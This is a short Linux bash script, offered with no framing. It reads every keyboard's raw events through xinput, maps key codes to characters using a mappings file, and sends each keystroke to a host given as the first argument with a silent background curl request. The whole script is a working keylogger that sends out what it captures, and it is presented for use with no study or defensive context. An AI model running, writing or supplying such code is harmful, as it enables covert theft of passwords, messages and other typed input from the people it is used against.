#pass ip:port to send to as first arg
get_keyboard_events(){
    xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 xinput test
}

# split string into multiple lines(array). Supports regex
split(){
    awk -F "$1" '{ for (i=1; i<=NF;++i){print $i;} }'
}

min() {
    ((( $1 < $2 )) && echo $1) || echo $2
}

SHIFT=1
while read -r line; do
    is_press=false
    if [[ $line == *"press"* ]]; then
        is_press=true;
    fi
    code=$(echo $line | sed 's/.* //g')
    mapping=$(cat mappings.txt | grep "^$code" | sed -E 's/(.*=> (\[ *|)| *\]$)//g')
    if [[ $mapping == "'shift'" ]]; then
        if [[ $is_press == true ]]; then
            SHIFT=2;
        else
            SHIFT=1;
        fi;
    fi;
    if [[ $line == *"press"* ]]; then
        mapping=($(echo $mapping | split ' '))
        ind=$(min ${#mapping} $SHIFT)
        #echo "${mapping[${ind}]}"
        (curl "http://$1?key=$(echo ${mapping[${ind}]})" &> /dev/null) &
    fi;

done < <(get_keyboard_events)
